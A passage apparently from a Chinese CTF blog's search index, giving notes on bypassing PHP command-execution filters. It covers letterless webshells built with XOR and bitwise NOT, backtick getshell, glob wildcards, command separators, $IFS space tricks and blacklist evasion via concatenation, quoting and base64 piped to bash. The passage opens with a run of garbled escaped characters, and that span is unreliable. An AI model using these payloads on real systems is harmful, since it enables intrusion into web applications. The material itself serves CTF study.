&gt;ba\\\\ &gt;\\|\\\\ &gt;7\\\\ &gt;Sk\\\\ &gt;X\\\\ &gt;x\\\\ &gt;Fs\\\\ &gt;FV\\\\ &gt;d\\\\ &gt;X0\\\\ &gt;k\\\\ &gt;g\\\\ &gt;bC\\\\ &gt;h\\\\ &gt;XZ\\\\ &gt;gZ\\\\ &gt;A\\\\ &gt;aH\\\\ &gt;w\\\\ &gt;D9\\\\ &gt;P\\\\ &gt;S}\\\\ &gt;IF\\\\ &gt;{\\\\ &gt;\\$\\\\ &gt;o\\\\ &gt;ch\\\\ &gt;e\\\\ sh a sh f 无字母shell异或有的时候会遇到这样的情况： &lt;?php error_reporting(0); highlight_file(__FILE__); if(!preg_match('/[a-z0-9]',$_GET['h3'])){ eval($_GET[h3]); } 过滤了数字和字母 这里们可以用到异或 &lt;?php echo \".\"^\"~\"; 输出结果为： P PHP中，两个变量进行异或的时候，会先将把字符串转换成ASCII值，再将ASCII值转换成二进制再进行异或，异或完又将结果从二进制转换成ASCII值，再转换成字符串。 取反1、二进制的最高位是符号位，0表示正数，1表示附属 2、正数的原码，反码，补码都是相同 3、负数的反码=它的原码的符号位不变，其它位取反（0-&gt;1,1-&gt;0） 4、负数的补码=它的反码+1 5、0的反码、补码都是0 6、PHP没有无符号数 7、在计算机运算的时候，都是以补码的方式来运算，那么运算的结果也是某个数的补码 &lt;?php echo urlencode(~\"phpinfo\"); #%8F%97%8F%96%91%99%90 自增##通配符 使用``反引号+”shell”的方式来getshell shell下可以利用.来执行任意脚本 .或者叫period，他的作用和source一样，就是用当前的shell执行一个文件中命令。比如，当前运行的shell是bash，则.file的意思就是用bash执行file文件中的命令 glob通配符 *可以代替0个及以上任意字符 ?可以代表一个任意字符 用[^x]的方法来构造”这个位置不是字符x” [0-9]来表示一个范围 https://man7.org/linux/man-pages/man7/glob.7.html 这里有glob的更多内容 命令执行绕过Linux命令1.查看文件 命令 作用 cat 由第一行开始显示内容，并将所有内容输出 tac 从最后一行倒序显示内容，并将所有内容输出 more 根据窗口大小，一页一页的显示文件 less 和more累死，但是可以往前翻页，而且可以搜索字符 head 只显示头几行 tail 只显示最后几行 nl 累死于cat -n，显示的时候输出行号 tailf 类似于tail -f od 读取所给予的文件的内容，并将其内容以八进制的字码显示出来 sort 将文件内容排序 rev 将文件中的每行内容以字符为单位反序输出 string 打印文件中可打印的字符 cut -f 1 filename从文件的每一行剪切字节，字符和字段并将这些字节，字符和字段写至标准输出 2.查找文件find . -name \"fla*\" locate fla* locate 命令无需指定路径，直接搜索即可。该命令实在mlocate.db的数据库下搜索，这个数据库位于/var/lib/mlocate/mlocate.db 它包含了系统中所有文件的索引，并且会在每天早上的时候由cron工具自动更新一次，可以sudo updadb更新其数据库 which 命令主要用来查询可执行文件的位置 whereis 命令会在系统默认安装目录（一般是用root权限时默认安装的软件）查找二进制文件、源码、文档中包含给定查询关键词的文件。 3.寻找文件内容grep -ar fla* / -a不忽略二进制文件 4.文件传输curl 利用curl下载文件 #使用内置option: -o #curl -o dodo1.jpg http:www.linux.com/dodo1.JPG #使用内置option: -O #curl -O http://www.linux.com/dodo1.jpg 5.命令分隔符1.%0a ---&gt;换行符 2.%0d ---&gt;回车符 3.;符号 再shell中，担任\"连续指令\"功能的符号就是\"分号\" 4.&amp;符号&amp;放在启动参数后面表示该进程为后台进程，默认情况下，进程是前台进程，这时九八shell给占据了，我们无法进行其他操作，对于那些没有交互的进程，很多时候，我们希望它在后台启动，可以在启动参数的时候加一个'&amp;'实现这个目的，进程切换到后台的时候，我们把它成为job，切换到后台的时候会输出相关job信息 5.|符号，管道符左面命令的输出就作为管道符右面命令的输入，所以左边的输出不显示 6.&amp;&amp;表示前一条命令执行时，才执行后一条命令 7.||表示上一条命令执行失败后，才执行下一条命令 8.命令终止符%00 %20 # 6.列目录ls dir 空格绕过$IFS在Linux下表示分隔符，单纯的cat$IFS2,bash解释器会把整个IFS2当作变量名，所以导致输出不来结果，然后如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用 ${IFS} $IFS$9 &lt; &lt;&gt; {,} 黑名单过滤1.拼接a=c;b=at;c=flag;$a$b $c 2.base64编码`echo \"Y2F0IGZsYWc=\"|base64 -d` echo \"Y2F0IGZsYWc=\"|base64 -d|bash 3.单引号、双引号c\"\"at flag c''at flag ca\"\"t fl''ag ###4.反斜线 \\ c\\at fl\\ag","categories":[],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"https://h3h3qaq.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]}],"categories":[],"tags":[{"name":"做题记录","slug":"做题记录","permalink":"https://h3h3qaq.github.io/tags/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"name":"网络安全","slug":"网络安全","permalink":"https://h3h3qaq.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]}